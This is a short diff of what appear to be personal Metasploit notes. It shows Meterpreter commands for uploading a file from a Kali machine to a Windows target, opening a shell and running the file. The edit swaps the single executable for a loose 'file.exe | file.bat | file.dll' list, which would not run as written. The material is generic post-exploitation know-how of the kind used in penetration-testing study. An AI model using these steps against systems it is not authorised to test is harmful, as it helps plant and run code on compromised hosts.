@@ -7,4 +7,4 @@ meterpreter > upload /root/desktop/anyfile c:\\anylocation
 ------------------------------------------------------------------
 from kali to windows - EXECUTE
 meterpreter > shell
-c:\users\downloads > file.exe
+c:\users\downloads > file.exe | file.bat | file.dll 
